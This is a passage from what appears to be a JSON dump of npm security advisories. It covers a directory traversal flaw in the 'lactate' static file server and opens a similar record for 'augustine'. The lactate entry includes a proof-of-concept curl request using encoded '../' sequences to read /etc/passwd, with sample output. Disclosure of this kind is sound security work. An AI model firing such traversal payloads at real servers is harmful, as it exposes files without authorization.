This allows for a remote attacker to gain access to arbitrary files on the filesystem that the process has access to read.\n\nMitigating factors:\nOnly files that the user running `lactate` has permission to read will be accessible via this vulnerability.\n\n\n[Proof of concept](https://hackerone.com/reports/296645):\nPlease globally install the `lactate` package and `cd` to a directory you wish to serve assets from. Next, run `lactate -p 8081` to start serving files from this location.\n\nThe following cURL request can be used to demonstrate this vulnerability by requesting the target `/etc/passwd` file:\n\n```\ncurl \"http://127.0.0.1:8081/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"\n```\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n[...]\n```","recommendation":"As there is currently no fix for this issue selecting an alternative static web server would be the best choice.","references":"- https://hackerone.com/reports/296645","legacy_slug":null,"allowed_scopes":["public","early","admin"],"cvss_vector":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","cvss_score":7.5,"cwe":"22"},{"id":559,"created_at":"2018-01-23T16:29:37.078+00:00","updated_at":"2018-05-08T14:27:01.985+00:00","title":"Directory Traversal","author":"Yasin Soliman (ysx)","module_name":"augustine","publish_date":"2018-01-23T16:29:48.657+00:00","cves":[],"vulnerable_versions":"<=99.999.99999","patched_versions":"<0.0.0","slug":"augustine_directory-traversal","overview":"Affected versions of `augustine` resolve relative file paths, resulting in a directory traversal vulnerability.
